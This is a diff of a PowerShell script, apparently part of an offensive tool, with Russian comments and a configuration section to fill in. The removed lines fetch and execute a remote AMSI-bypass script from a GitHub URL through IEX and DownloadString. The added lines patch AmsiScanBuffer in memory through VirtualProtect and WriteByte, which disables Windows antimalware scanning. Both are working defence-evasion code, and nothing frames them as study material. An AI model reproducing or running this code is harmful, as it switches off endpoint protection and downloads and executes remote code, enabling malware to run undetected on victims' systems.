@@ -1,8 +1,21 @@
-# ============================================================
-#  AMSI BYPASS (простой, без Base64)
-# ============================================================
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chainski/GlobalAMSIBypass/main/amsi.ps1')
-
+# === AMSI Bypass ????? WinAPI (???????? ?????) ===
+$Win32 = Add-Type -memberDefinition @"
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@ -name "Win32" -namespace Win32Functions -passthru
+$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+$old = 0
+$Win32::VirtualProtect($ptr, [UIntPtr]::new(5), 0x40, [ref]$old)
+[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 0, 0xB8)
+[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 1, 0x57)
+[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 2, 0x00)
+[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 3, 0x07)
+[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 4, 0x80)
+[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 5, 0xC3)
 # ============================================================
 #  КОНФИГУРАЦИЯ (ЗАМЕНИТЕ ЭТИ ТРИ СТРОКИ)
 # ============================================================
